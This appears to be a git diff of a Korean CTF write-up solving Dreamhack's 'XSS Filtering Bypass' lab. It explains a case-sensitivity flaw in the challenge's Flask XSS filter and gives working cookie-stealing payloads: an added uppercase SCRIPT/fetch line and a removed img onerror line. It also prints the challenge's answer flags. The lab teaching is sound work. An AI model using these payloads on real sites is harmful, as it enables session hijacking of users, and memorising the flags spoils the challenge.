@@ -1,7 +1,7 @@
 ---
 title: "[Dreamhack] XSS Filtering Bypass 해설"
 author: jyp
-date: 2026-06-09 12:00:00 +0900
+date: 2026-06-09 12:00:01 +0900
 categories: [Dreamhack]
 tags: [dreamhack , WebHacking]
 math: true
@@ -22,11 +22,13 @@ math: true
 
 ```
 /
-├── app.py
-├── static
-│   #생략
-└── templates
-    #생략
+├── deploy
+│   ├── app.py
+│   ├── flag.txt
+│   ├── requirements.txt
+│   ├── static
+│   └── templates
+└── Dockerfile
 ```
 
 ## 주요 코드 
@@ -66,6 +68,12 @@ def check_xss(param, cookie={"name": "name", "value": "value"}):
     url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
     return read_url(url, cookie)
 
+def xss_filter(text):
+    _filter = ["script", "on", "javascript:"]
+    for f in _filter:
+        if f in text.lower():
+            text = text.replace(f, "")
+    return text
 
 @app.route("/")
 def index():
@@ -74,7 +82,9 @@ def index():
 
 @app.route("/vuln")
 def vuln():
-    return render_template("vuln.html")
+    param = request.args.get("param", "")
+    param = xss_filter(param)
+    return param
 
 
 @app.route("/flag", methods=["GET", "POST"])
@@ -87,6 +97,7 @@ def flag():
             return '<script>alert("wrong??");history.go(-1);</script>'
 
         return '<script>alert("good");history.go(-1);</script>'
+
 
 memo_text = ""
 
@@ -101,59 +112,53 @@ def memo():
 
 ```
 
+이 문제는 문제의 제목 그대로 ![XSS-2](https://1221jyp.com/posts/Dreamhack_Xss-2/)문제와 매우 유사한 문제이지만, 특정 명령어를 `/vuln`주소로 이동할 수 없게 막아놓은 코드가 존재한다. 
 
-{% raw %}
-```html
-# /templates/vuln.html
-
-{% extends "base.html" %}
-{% block title %}Index{% endblock %}
-
-{% block head %}
-  {{ super() }}
-  <style type="text/css">
-    .important { color: #336699; }
-  </style>
-{% endblock %}
-
-{% block content %}
-    <div id='vuln'></div>
-    <script>var x=new URLSearchParams(location.search); document.getElementById('vuln').innerHTML = x.get('param');</script>
-{% endblock %}
-
-```
-{% endraw %}
-
-
-이 문제는 문제의 제목 그대로 `XSS`를 활용하는 문제로, 봇(어드민)이 취약점이 존재하는 `/vuln` 주소로 접속하게 하여 특정 스크립트를 실행하게 만드는 문제이다.
-
+`XSS`가 무엇인지 궁금하다면 ![XSS-2](https://1221jyp.com/posts/Dreamhack_Xss-2/)문제를 먼저 확인하자.
 
 # 풀이
 
-## XSS란? By claude code
-**XSS (Cross-Site Scripting)**는 공격자가 웹 페이지에 악성 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행시키는 웹 보안 취약점입니다.
+## 필터에 작성되어있는 특정 문자들을 사용하지 않고 페이로드 작성하기
+```python
+def xss_filter(text):
+    _filter = ["script", "on", "javascript:"]
+    for f in _filter:
+        if f in text.lower():
+            text = text.replace(f, "")
+    return text
+```
+필터로 작동되는 함수를 확인하면, 대문자로 페이로드를 작성했을때, `text.lower()`로 인해서 감지는 가능하지만, 
+해당 텍스트를 삭제할 때에는 소문자로 된 텍스트만 삭제하기 때문에, 대문자로 작성된 스크립트는 우회가 가능하다.
 
-## 웹 주소에 스크립트를 작성하여 플래그 탈취
 
-`/vuln`주소에서는 `'param'`이라는 파라미터에 적혀있는 내용물을 id = vuln인 div 태그 속에 집어넣는다.
-이때, `/vuln`주소의 `param`파라미터에 페이로드를 작성하여 div태그 속에서 악성 코드가 작동되도록 한다.
+
+**EX)**
+
+**script1 => 1**
+
+**SCRIPT1 => SCRIPT1**
+
+
+```python
+def vuln():
+    param = request.args.get("param", "")
+    param = xss_filter(param)
+    return param
+```
+
+또한 `/vuln`주소에서 param을 그대로 `return`하기 때문에 `<SCRIPT>`태그가 사용 가능하다.
 
 ## 페이로드
 
-`<img src=x onerror="location.href='http://127.0.0.1:8000/memo?memo='+document.cookie">`
+```html
+<SCRIPT>fetch('/memo?memo='+document.cookie)</SCRIPT>
 
-위 페이로드를 `/flag` 주소의 `<input>`에 입력하거나, param이라는 파라미터에 해당 페이로드를 작성하여 `POST`요청을 보내면 해킹에 성공한다.
-vuln.html의 파일을 보면 Innerhtml이라는 함수가 있는데 해당 함수는
-`<script>`속에서 작성되는 코드만 막혀 있고, 다른 태그들에 존재하는 이벤트 핸들러 속 스크립트를 작동하지 않게 하는 기능은 없다. 따라서 `<img>`태그를 가져오고, 의도적으로 오류가 발생하게 하여 `onerror`라는 이벤트 핸들러를 작동하게 하여 페이로드를 실행시킬 수 있게 만든다.
+```
 
-## 작동 시연
-
-![작동1](https://github.com/user-attachments/assets/0eb5c02e-aa6b-4c4f-8963-9578b5291f8a)
-![작동2](https://github.com/user-attachments/assets/8f8243f0-6b74-4b97-a8e7-77683d789287)
-
+해당 페이로드를 `/flag`의 `<input>` 박스에 넣고 전송하면 `/memo`에서 플래그를 확인할 수 있다.
 
 
 # 정답
 
-DH{3c01577e9542ec24d68ba0ffb846508f}
+DH{81cd7cb24a49ad75b9ba37c2b0cda4ea}
 
